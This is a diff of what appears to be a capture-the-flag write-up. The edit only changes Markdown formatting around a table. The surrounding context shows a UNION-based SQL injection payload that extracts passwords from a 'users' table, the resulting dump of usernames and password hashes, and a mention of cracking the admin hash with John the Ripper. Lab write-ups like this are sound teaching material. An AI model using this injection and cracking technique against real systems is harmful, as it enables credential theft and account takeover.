@@ -43,13 +43,13 @@ bob'+UNION+SELECT+CAST((SELECT+password+FROM+users+LIMIT+1+OFFSET+2)+AS+int),'2'
 <img src="imgs/sqli.png">
 
 Changing the LIMIT and OFFSET value, we can map out the `users` table as such:
-```
+
 | username      | password                                                      |
 | ------------- | ------------------------------------------------------------- |
 | cryptocat     | y0/HlOtAkyWN1KzjKOQlge2uyHYEHEfQV3ynFBTV/nvfM5IS/x6Sq         |
 | invincible    | y0/avsmtl2dS2XVcRWT6E5OzrnUg8FU1dg6RvYd/9KTmcO0BctXGxa        |
 | tjfry_admin   | $2y$10$buhvcTHdjqnb2r0L15ilJefOlGTe1rpD31685K02KfOk7xizNisiy  |
-```
+
 
 We can use John the Ripper to crack the hash of `tjfry_admin`:
 
